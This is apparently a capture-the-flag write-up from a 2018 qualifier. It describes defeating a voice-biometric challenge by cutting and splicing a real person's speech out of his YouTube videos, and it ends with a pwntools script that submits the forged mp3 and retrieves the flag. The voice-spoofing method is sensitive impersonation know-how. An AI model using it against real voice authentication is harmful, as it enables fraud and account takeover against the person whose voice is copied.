---
layout: post
---
Hey folks! Before proceeding with our writeup, we decided to let Adam Doupé personally explain the challenge.

<https://www.youtube.com/watch?v=CpINXrwcTt0>


### The real exploit

The challenge asked us to upload an mp3 file containing a given sentence read with the voice of Adam Doupé.

Luckily, Adam's YouTube channel is full of videos of him doing live challenges of pwnable.kr -- and we decided to cut and paste pieces of those to get the requested audio.
First we downloaded as many audio tracks as possible with their automated transcriptions (thanks YouTube!) and parsed the `.srt` files to obtain the full transcription of the videos and the words timestamps. In this way we created a big corpus of words -- now to decide what to do with it!

At first misdirected by the tag `ML` we thought we could train a model to say something with Adam's voice, but we didn't find any solution that we could get to work fast.

Instead, from the test service of the challenge we observed that the requested sentences where formed by recurring chunks of words and the same sentences were repeated after a while. Moreover, we found the same chunks on the corpus created from the downloaded videos -- meaning that it probably is the source of sounds for the challenge service as well.

Thanks to these frequent repetitions of chunks, and eventually sentences, we selected the most frequent chunks. After that we started cutting the chunks out from the tracks and assembling them to match the challenge phrases. After obtaining few samples we started submitting them, checking if the sentence was read correctly and fixing what was not. After waiting for some iterations, we finally received one challenge for which we had a good .mp3 file ready -- and bypassed the "biometric" system.


{% highlight python %}
from pwn import *
import sys

HOST = '73dde216.quals2018.oooverflow.io'

# HOST = '17470319.quals2018.oooverflow.io'

PORT = 31337

def solve_pow(s, n):
    r = remote('localhost', 4000) # local pow server
    r.sendline(s + ' ' + str(n))
    res = r.recvline().strip()
    r.close()
    return res

r = remote(HOST, PORT)
print r.recvuntil('Challenge: ')
chall = r.recvline().strip()
print chall
print r.recvuntil('n: ')
n = r.recvline().strip()
print n
sol = solve_pow(chall, n)
print r.recvuntil('Solution:')
r.sendline(sol)

print r.recvuntil('>')
r.sendline('yes')
print r.recvuntil('Would you like to access your tunes?')
r.sendline('yes')

print r.recvuntil('CHALLENGE PHRASE: ')
chal = r.recvline().strip()

print chal
i = raw_input()

filename=chal.strip().replace(' ', '_') + '.mp3'

try:
    with open(filename) as f:
        solve=f.read()
except:
    exit()

print 'Read {} bytes'.format(len(solve))

print r.recvuntil('What is the size of your voiceprint mp3?')

r.sendline(str(len(solve)))

r.send(solve)

print 'Sending...'

r.recvuntil('Done')

print 'Done'

with open('flag.mp4','w') as f:
    while True:
        out =  r.recv(1, timeout=10)
        sys.stdout.write(out)
        f.write(out)
{% endhighlight %}
